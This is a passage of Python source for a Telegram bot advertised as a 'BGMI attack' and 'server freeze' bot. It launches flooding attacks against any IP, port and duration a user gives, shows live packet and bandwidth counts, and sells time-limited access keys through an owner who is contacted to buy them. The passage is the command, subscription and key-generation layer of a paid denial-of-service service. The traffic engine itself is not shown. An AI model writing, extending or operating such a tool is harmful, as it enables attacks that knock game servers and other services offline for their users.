                    f"║  ⏱️ Remaining: {remaining} ║\n"
                    "║  🚀 Access Granted      ║\n"
                    "╚══════════════════════════╝\n\n"
                    "Key accepted! Preparing attack... ⚡"
                )
                await asyncio.sleep(0.5)
                await checking_msg.delete()
                await execute_attack(client, msg, uid)
                return
            else:
                del u["keys"][str(uid)]
                jsave(USERS_DB, u)
                await checking_msg.edit_text(
                    "⛔ **ACCESS DENIED**\n\n"
                    "╔══════════════════════════╗\n"
                    "║  ❌ KEY EXPIRED          ║\n"
                    "║  ⏰ Time's Up!           ║\n"
                    "║  🔒 Access Revoked      ║\n"
                    "╚══════════════════════════╝\n\n"
                    "Your key has expired.\n"
                    "Please purchase a new key!\n\n"
                    f"📲 Contact: FATHER OF BOT"
                )
                return
        except:
            pass
    
    await checking_msg.edit_text(
        "⛔ **ACCESS DENIED**\n\n"
        "╔══════════════════════════╗\n"
        "║  ❌ NO ACTIVE PLAN       ║\n"
        "║  🔒 Subscription Required ║\n"
        "║  🚫 Access Blocked       ║\n"
        "╚══════════════════════════╝\n\n"
        "🔑 You don't have any active plan!\n\n"
        "To get access:\n"
        "• Buy a key from the owner\n"
        "• Redeem your key using /redeem\n"
        "• Get premium access\n\n"
        f"👑 Contact: FATHER OF BOT\n"
        "🛒 For Key Purchase: @FathersOfCreater"
    )

async def execute_attack(client, msg, uid):
    global attacking, ainfo, amsg, attack_user
    
    parts = msg.text.split()
    if len(parts) < 4:
        await msg.reply_text("⚠️ /attack IP PORT TIME\n📋 /attack 1.2.3.4 8080 600")
        return
    
    if attacking:
        e = time.time() - ainfo['start']
        await msg.reply_text(f"⚠️ Already attacking! {int(e)}s\n🛑 Use Stop button")
        return
    
    ip = parts[1]
    try: port = int(parts[2])
    except: 
        await msg.reply_text("❌ Invalid port!")
        return
    try: dur = int(parts[3])
    except: 
        await msg.reply_text("❌ Invalid time!")
        return
    
    info = get_user_info(uid)
    threads = info['threads']
    max_t = info['max_time']
    if dur > max_t: 
        dur = max_t
    
    ainfo = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
    attacking = True
    attack_user = uid
    
    vid = rand_vid()
    text = (
        "💀 **ATTACK LAUNCHED**\n\n"
        "╔══════════════════════════╗\n"
        f"║ 🎯 Target: {ip}:{port}     ║\n"
        f"║ ⏱️ Duration: {dur}s        ║\n"
        f"║ 🧵 Threads: {threads}     ║\n"
        f"║ 👤 User: {uid}         ║\n"
        "╚══════════════════════════╝\n\n"
        "⚡ System compromised!\n"
        "🔴 Attack in progress..."
    )
    amsg = await send_vid(msg.chat.id, text, None, vid)
    add_history(uid, "ATTACK START", f"{ip}:{port} | {dur}s")
    
    async def live():
        t0 = time.time()
        while attacking:
            await asyncio.sleep(2)
            try:
                e = time.time() - t0
                if e >= dur: break
                pct = (e/dur)*100
                bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
                await amsg.edit_text(
                    f"💀 **ATTACKING**\n\n"
                    f"╔══════════════════════════╗\n"
                    f"║ 🎯 {ip}:{port}              ║\n"
                    f"║ ⏱️ {int(e)}s / {dur}s        ║\n"
                    f"║ 📊 [{bar}] {pct:.0f}%      ║\n"
                    f"║ 📦 {attacker.pkts:,} pkts  ║\n"
                    f"║ 📶 {mbps:.1f} Mbps          ║\n"
                    "╚══════════════════════════╝\n\n"
                    "🛑 Press STOP to abort"
                )
            except: pass
    
    asyncio.create_task(live())
    
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(None, attacker.start, ip, port, dur, threads)
    attacking = False
    attack_user = None
    
    add_history(uid, "ATTACK END", f"{ip}:{port} | {stats['pkts']:,} pkts")
    
    vid = rand_vid()
    done = (
        "✅ **ATTACK COMPLETED**\n\n"
        "╔══════════════════════════╗\n"
        f"║ 🎯 {ip}:{port}              ║\n"
        f"║ 📦 {stats['pkts']:,} pkts  ║\n"
        f"║ 📶 {stats['mbps']:.1f} Mbps║\n"
        f"║ ⏱️ {dur}s Completed      ║\n"
        "╚══════════════════════════╝\n\n"
        "🔄 /attack IP PORT TIME"
    )
    if vid and os.path.exists(vid["path"]):
        await app.send_video(msg.chat.id, vid["path"], caption=done)
    try: 
        await amsg.edit_text(done)
    except: 
        pass

# ═══════════════ STOP ═══════════════
@app.on_message(filters.command("stop"))
async def stop_cmd(client, msg):
    global attacking
    if not check_access(msg.from_user.id)[0]: return
    if attacking:
        attacker.on = False; attacking = False
        vid = rand_vid()
        text = f"⛔ **STOPPED**\n\n📦 {attacker.pkts:,} packets\n\n🔄 /attack IP PORT TIME"
        await send_vid(msg.chat.id, text, None, vid)
    else:
        await msg.reply_text("💤 No attack running!")

# ═══════════════ REDEEM ═══════════════
@app.on_message(filters.command("redeem"))
async def redeem_cmd(client, msg):
    uid = msg.from_user.id
    access, a_type = check_access(uid)
    if access:
        info = get_user_info(uid)
        return await msg.reply_text(f"✅ ALREADY UNLOCKED\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\nUse /start for menu")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(f"⚿ REDEEM KEY\n\n{LINE}\n📋 /redeem KEY\n🔑 /redeem BGMI-XXXX-XXXX-XXXX\n{LINE}\n📲 FATHER OF BOT")
    
    key = parts[1].upper()
    success, result = redeem_key_code(key, uid)
    
    if success:
        vid = rand_vid()
        text = f"🎉 KEY REDEEMED\n\n{LINE}\n🔑 Key: {key[:20]}...\n📅 Expires: {result}\n{LINE}\n\n🔓 Access granted!\n📋 Send /start"
        await send_vid(msg.chat.id, text, None, vid)
    else:
        await msg.reply_text(f"❌ {result}\n\n📲 FATHER OF BOT")

# ═══════════════ COMMANDS COMMAND ═══════════════
@app.on_message(filters.command("commands"))
async def commands_cmd(client, msg):
    uid = msg.from_user.id
    is_owner = (uid == OWNER_ID)
    commands_text = get_commands_list(is_owner)
    formatted_text = commands_text.replace("{OWNER_LINK}", OWNER_LINK).replace("{BOT_USERNAME}", BOT_USERNAME)
    await msg.reply_text(formatted_text, reply_markup=menu_back_kb())

# ═══════════════ EMOJI COMMANDS ═══════════════
@app.on_message(filters.command("addemoji"))
async def add_emoji_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message:
        return await msg.reply_text(
            f"⎘ **ADD EMOJI**\n\n"
            "Reply to a premium emoji with:\n"
            "`/addemoji`\n\n"
            "✨ The emoji will be added to welcome animation!"
        )
    
    emoji_id = None
    
    if msg.reply_to_message.sticker:
        emoji_id = msg.reply_to_message.sticker.file_id
    elif hasattr(msg.reply_to_message, 'custom_emoji_id') and msg.reply_to_message.custom_emoji_id:
        emoji_id = msg.reply_to_message.custom_emoji_id
    
    if emoji_id:
        success, total = add_emoji(emoji_id)
        if success:
            await msg.reply_text(
                f"✅ **EMOJI ADDED** 🎉\n\n"
                f"🔹 Total Emojis: {total}\n\n"
                "✨ This emoji will appear randomly in welcome animation!"
            )
        else:
            await msg.reply_text("❌ This emoji is already in the list!")
    else:
        await msg.reply_text(
            "❌ No emoji found!\n\n"
            "Please reply to a premium emoji or sticker."
        )

@app.on_message(filters.command("removeemoji"))
async def remove_emoji_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            f"⌫ **REMOVE EMOJI**\n\n"
            "Use: `/removeemoji index`\n\n"
            "Get index from `/listemojis` command."
        )
    
    try:
        index = int(parts[1]) - 1
        success, removed, total = remove_emoji(index)
        if success:
            await msg.reply_text(
                f"✅ **EMOJI REMOVED**\n\n"
                f"🔹 Remaining Emojis: {total}"
            )
        else:
            await msg.reply_text(f"❌ Invalid index! Total emojis: {total}")
    except ValueError:
        await msg.reply_text("❌ Invalid index! Use a number.")

@app.on_message(filters.command("listemojis"))
async def list_emojis_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    emojis = get_all_emojis()
    
    if not emojis:
        return await msg.reply_text("📭 No emojis added yet!\n\nAdd using `/addemoji`")
    
    text = f"⌘ **EMOJI LIST**\n\n"
    for i, emoji_id in enumerate(emojis, 1):
        text += f"**{i}.** `{emoji_id[:30]}...`\n"
    
    text += f"\n🔹 Total: {len(emojis)}"
    await msg.reply_text(text)

@app.on_message(filters.command("resetemojis"))
async def reset_emojis_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    reset_emojis()
    await msg.reply_text(
        f"↺ **EMOJIS RESET**\n\n"
        f"🔹 Total Emojis: 0\n\n"
        "All emojis have been removed from the list."
    )

# ═══════════════ STICKER COMMANDS ═══════════════
@app.on_message(filters.command("addsticker"))
async def add_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message:
        return await msg.reply_text(
            f"⎘ **ADD STICKER**\n\n"
            "Reply to a sticker with:\n"
            "`/addsticker`\n\n"
            "✨ The sticker will appear randomly in welcome animation!\n\n"
            f"⏱️ Default Sticker Time: {get_sticker_display_time()}s"
        )
    
    if not msg.reply_to_message.sticker:
        return await msg.reply_text("❌ Please reply to a sticker!")
    
    sticker_id = msg.reply_to_message.sticker.file_id
    
    duration = get_sticker_display_time()
    try:
        if hasattr(msg.reply_to_message.sticker, 'duration'):
            duration = msg.reply_to_message.sticker.duration
        elif hasattr(msg.reply_to_message.sticker, 'emoji'):
            sticker_obj = msg.reply_to_message.sticker
            if hasattr(sticker_obj, 'duration'):
                duration = sticker_obj.duration
    except:
        duration = get_sticker_display_time()
    
    if duration < 2:
        duration = get_sticker_display_time()
    
    success, total = add_sticker(sticker_id, duration)
    
    if success:
        await msg.reply_text(
            f"✅ **STICKER ADDED** 🎉\n\n"
            f"🔹 Total Stickers: {total}\n"
            f"⏱️ Duration: {duration} seconds\n\n"
            "✨ This sticker will appear randomly in welcome animation!\n"
            f"📋 Current Settings:\n"
            f"• Sticker Time: {get_sticker_display_time()}s\n"
            f"• Video Delay: {get_video_delay_time()}s"
        )
    else:
        await msg.reply_text("❌ This sticker is already in the list!")

@app.on_message(filters.command("removesticker"))
async def remove_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            f"⌫ **REMOVE STICKER**\n\n"
            "Use: `/removesticker index`\n\n"
            "Get index from `/liststickers` command."
        )
    
    try:
        index = int(parts[1]) - 1
        success, removed, total = remove_sticker(index)
        if success:
            await msg.reply_text(
                f"✅ **STICKER REMOVED**\n\n"
                f"🔹 Remaining Stickers: {total}"
            )
        else:
            await msg.reply_text(f"❌ Invalid index! Total stickers: {total}")
    except ValueError:
        await msg.reply_text("❌ Invalid index! Use a number.")

@app.on_message(filters.command("liststickers"))
async def list_stickers_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    stickers = get_all_stickers()
    sticker_times = get_sticker_times()
    
    if not stickers:
        return await msg.reply_text("📭 No stickers added yet!\n\nAdd using `/addsticker`")
    
    text = f"⌘ **STICKER LIST**\n\n"
    for i, sticker_id in enumerate(stickers, 1):
        time = sticker_times.get(sticker_id, get_sticker_display_time())
        text += f"**{i}.** `{sticker_id[:25]}...` ⏱️ {time}s\n"
    
    text += f"\n🔹 Total: {len(stickers)}"
    text += f"\n\n📋 Settings: Sticker Time: {get_sticker_display_time()}s | Video Delay: {get_video_delay_time()}s"
    await msg.reply_text(text)

@app.on_message(filters.command("resetstickers"))
async def reset_stickers_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    reset_stickers()
    await msg.reply_text(
        f"↺ **STICKERS RESET**\n\n"
        f"🔹 Total Stickers: 0\n\n"
        "All stickers have been removed from the list."
    )

# ═══════════════ VIDEO COMMANDS ═══════════════
@app.on_message(filters.command("addvideo"))
async def add_video_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    if msg.reply_to_message and msg.reply_to_message.video:
        s = await msg.reply_text("📂 Adding Video 📸")
        try:
            path = await msg.reply_to_message.download()
            vid = add_vid(path)
            
            duration = "Unknown"
            if msg.reply_to_message.video.duration:
                mins = msg.reply_to_message.video.duration // 60
                secs = msg.reply_to_message.video.duration % 60
                duration = f"{mins}m {secs}s"
            
            text = (
                f"✅ **VIDEO ADDED SUCCESSFULLY** ✅\n\n"
                f"{LINE}\n"
                f"🆔 Video ID: {vid}\n"
                f"📁 Name: {os.path.basename(path)[:30]}\n"
                f"📹 Total Videos: {len(get_vids())}\n"
                f"⏱️ Duration: {duration}\n"
                f"{LINE}\n\n"
                "🎲 Video will play randomly on welcome!\n"
                "📋 /videos to see all videos\n"
                f"⏱️ Video Delay: {get_video_delay_time()}s"
            )
            await s.edit_text(text)
        except Exception as e:
            await s.edit_text(f"❌ Error: {e}")
    else:
        await msg.reply_text("❌ Reply to a video!")

@app.on_message(filters.command("videos"))
async def list_vids_cmd(client, msg):
    if not check_access(msg.from_user.id)[0]: return
    vids = get_vids()
    if not vids: return await msg.reply_text("📹 No videos!")
    text = f"📹 **VIDEOS ({len(vids)}):**\n\n"
    for v in vids[:15]:
        text += f"#{v['id']} {v['name'][:30]}\n"
    text += f"\n⏱️ Video Delay: {get_video_delay_time()}s"
    await msg.reply_text(text)

@app.on_message(filters.command("delvideo"))
async def del_vid_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.reply_text("❌ /delvideo ID")
    try:
        if del_vid(int(parts[1])):
            await msg.reply_text(f"✅ Video #{parts[1]} deleted!\n📹 Remaining: {len(get_vids())}")
        else:
            await msg.reply_text("❌ Not found!")
    except:
        await msg.reply_text("❌ Invalid ID!")

@app.on_message(filters.command("clearvideos"))
async def clear_vids_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    n = clear_vids()
    await msg.reply_text(f"🗑️ {n} videos cleared!")

# ═══════════════ ADMIN COMMANDS ═══════════════
@app.on_message(filters.command("genkey") & filters.private)
async def genkey_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 3:
        return await msg.reply_text(
            f"⚿ **GENKEY**\n\n"
            "Use: `/genkey NAME TIME`\n\n"
            "Examples:\n"
            "/genkey Premium 7d\n"
            "/genkey VIP 30m\n"
            "/genkey Test 24h\n\n"
            "⏱️ Units: m=min, h=hour, d=day, w=week, mo=month"
        )
    
    name = parts[1]
    time_str = parts[2]
    
    key_code, duration = create_key(name, time_str)
    
    if key_code:
        await msg.reply_text(
            f"⚿ **KEY GENERATED**\n\n"
            f"{LINE}\n"
            f"🪪 Name: {name}\n"
            f"⏱️ Duration: {duration}\n"
            f"🔑 Key: `{key_code}`\n"
            f"{LINE}\n\n"
            f"📋 User: /redeem {key_code}"
        )
    else:
        await msg.reply_text("❌ Invalid time format!\n\nUse: 30m, 1h, 7d, 2w, 1mo")

@app.on_message(filters.command("admin_keys") & filters.private)
async def admin_keys_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    keys = get_keys()
    active = [k for k, v in keys.items() if v["active"]]
    used = [k for k, v in keys.items() if not v["active"]]
    await msg.reply_text(
        f"⌘ **ALL KEYS**\n\n{LINE}\n"
        f"🟢 Active: {len(active)}\n"
        f"🔴 Used: {len(used)}\n"
        f"📊 Total: {len(keys)}\n{LINE}"
    )

@app.on_message(filters.command("admin_stats") & filters.private)
async def admin_stats_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    vids = get_vids()
    users = get_users()
    await msg.reply_text(
        f"⎙ **STATS**\n\n{LINE}\n"
        f"📹 Videos: {len(vids)}\n"
        f"💎 Premium: {len(users.get('premium', []))}\n"
        f"🔑 Key Users: {len(users.get('keys', {}))}\n"
        f"⚡ Attack: {'🟢 On' if attacking else '💤 Idle'}\n"
        f"{LINE}\n"
        f"⚙️ Settings:\n"
        f"⏱️ Sticker Time: {get_sticker_display_time()}s\n"
        f"⏱️ Video Delay: {get_video_delay_time()}s"
    )

@app.on_message(filters.command("admin_clear") & filters.private)
async def admin_clear_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    removed = remove_expired()
    await msg.reply_text(f"↺ {removed} expired keys removed!")

# ═══════════════ AUTO EXPIRE ═══════════════
async def auto_expire():
    while True:
        await asyncio.sleep(300)
        remove_expired()

# ═══════════════ INIT ═══════════════
for f, d in [
    (VIDEO_DB, []), 
    (USERS_DB, {"premium": [], "keys": {}}), 
    (KEYS_DB, {}), 
    (BLOCKED_DB, []), 
    (HISTORY_DB, {}), 
    (STICKER_DB, {"stickers": []}),
    (EMOJI_DB, {"emojis": []}),
    (STICKER_TIME_DB, {}),
    (SETTINGS_DB, {"sticker_time": DEFAULT_STICKER_TIME, "video_delay": DEFAULT_VIDEO_DELAY})
]:
    if not os.path.exists(f): jsave(f, d)

os.makedirs("downloads", exist_ok=True)
asyncio.get_event_loop().create_task(auto_expire())

print("""
╔══════════════════════════════════════╗
║  💀 BGMI ATTACK BOT - ULTRA PRO     ║
║  SERVER FREEZE BOT                  ║
║  ✅ 5 TEXT STYLES + PREMIUM SYMBOLS ║
║  ✅ MENU + BACK BUTTONS SATH MEIN   ║
║  ✅ PERFECT TIMING                  ║
║  ✅ 13 EMOJIS - 13 WORDS            ║
║  ✅ SET ALL STICKER TIME            ║
║  ✅ SET VIDEO DELAY                 ║
║  ✅ NO PREMIUM_STYLE TEXT DISPLAY   ║
║  SIRF INLINE BUTTONS                ║
╚══════════════════════════════════════╝
✅ Bot Ready!
""")

if __name__ == "__main__":
    app.run()
